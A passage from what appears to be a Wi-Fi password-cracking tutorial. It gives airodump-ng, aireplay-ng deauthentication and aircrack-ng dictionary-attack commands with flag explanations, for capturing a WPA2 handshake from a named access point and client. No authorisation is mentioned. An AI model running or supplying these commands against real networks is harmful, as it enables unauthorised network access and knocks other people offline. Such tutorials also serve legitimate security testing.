5. To view the clients connected to the target network.

sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon

    airodump-ng : For packet capturing
    -c : Channel  
    --bssid : MAC address of a wireless access point(WAP).
    -w : The Directory where you want to save the file(Password File).
    wlan0mon : Name of the interface.
 
6.  Open a new terminal window to disconnect the clients connected 
    to the target network.  
 
  sudo aireplay-ng -0 10 -a 3C:7C:3F:B5:F3:A0  -c 10:D5:61:EC:E6:B8 wlp1s0mon
    
     aireplay-ng : To inject frames
    -0 : For deauthentication
    10 : No. of deauthentication packets to be sent(0 would mean infinite)
    -a : For the bssid of the target network
    wlp1s0mon : Name of the interface.
 
  When the client is disconnected from the target network. 
  He tries to reconnect to the network and when he does you will
   get something called WPA handshake in the previous window of
    the terminal. 
 
 7. To decrypt the password. Open the Files application. 
 
 aircrack-ng -a2 -b  3C:7C:3F:B5:F3:A0 -w /usr/share/metasploit-framework/data/wordlists/common_roots.txt ./-01.cap
 
 aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
-a : -a2 for WPA2 & -a for WPA network
-b : The BSSID of the target network
-w : Location of the wordlist file
-01.cap :  cap file
